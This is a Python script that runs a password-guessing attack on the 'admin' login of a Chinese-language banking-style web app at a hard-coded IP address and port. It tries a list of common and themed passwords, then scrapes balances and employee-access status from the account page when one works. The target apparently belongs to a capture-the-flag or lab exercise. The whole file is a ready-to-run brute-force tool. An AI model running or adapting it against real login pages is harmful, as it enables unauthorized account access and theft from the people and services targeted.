import urllib.request, urllib.parse, http.cookiejar, re, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33681"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


PWDS = ["pw123456", "admin", "admin123", "123456", "password", "12345678",
        "admin888", "root", "000000", "111111", "abc123", "qwerty",
        "letmein", "welcome", "guest", "test", "1234", "12345", "pass",
        "secret", "star", "gold", "bank", "666666", "888888", "5201314",
        "iloveyou", "1q2w3e4r", "admin@123", "Admin123", "P@ssw0rd",
        "PWNED123", "NP123", "p", "123", "123123", "a123456", "aa123456",
        "adminadmin", "administrator", "passwd", "123456789", "987654321",
        "goldcoin", "goldcoinbank", "夜班柜员", "bank123", "huochetou"]
for pw in PWDS:
    op = sess()
    s, b = req(op, "/login", {"username": "admin", "password": pw}, "POST")
    if "我的账户" in b:
        t = clean(b)
        d = re.search(r"(\d+) 存款余额", t)
        c = re.search(r"(\d+) 现金金币", t)
        emp = "内部员工" in t and "暂不可用" not in t
        print(f"*** HIT admin / {pw!r}  dep={d.group(1) if d else '?'} cash={c.group(1) if c else '?'} EMPLOYEE={emp}")
        break
    if "密码错误" in b:
        print(f"  admin/{pw!r}: 密码错误 (账号存在)")
else:
    print("no hit")
